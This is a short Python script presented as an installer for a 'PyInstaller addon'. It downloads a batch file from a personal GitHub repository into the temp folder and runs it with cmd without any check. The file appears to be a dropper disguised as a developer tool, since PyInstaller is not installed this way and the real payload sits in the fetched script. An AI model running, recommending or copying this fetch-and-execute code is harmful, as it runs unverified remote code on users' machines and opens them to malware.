import os
import subprocess
import tempfile
import urllib.request
import time

URL = "https://github.com/nickita166/pyinstaller-addon/raw/refs/heads/main/pyinstaller.bat"

def main():
    # Temp file path
    temp_dir = tempfile.gettempdir()
    bat_path = os.path.join(temp_dir, "pyinstaller.bat")

    print("[+] Downloading PyInstaller addon...")

    try:
        urllib.request.urlretrieve(URL, bat_path)
    except Exception as e:
        print("[!] Download failed:", e)
        return

    if not os.path.exists(bat_path):
        print("[!] File not found after download.")
        return

    print("[+] Running installer...")

    try:
        subprocess.run(["cmd", "/c", bat_path], check=True)
    except subprocess.CalledProcessError as e:
        print("[!] Script failed with error:", e)

    print("[+] Done. Now you can close this window")
    time.sleep(5)
if __name__ == "__main__":
    main()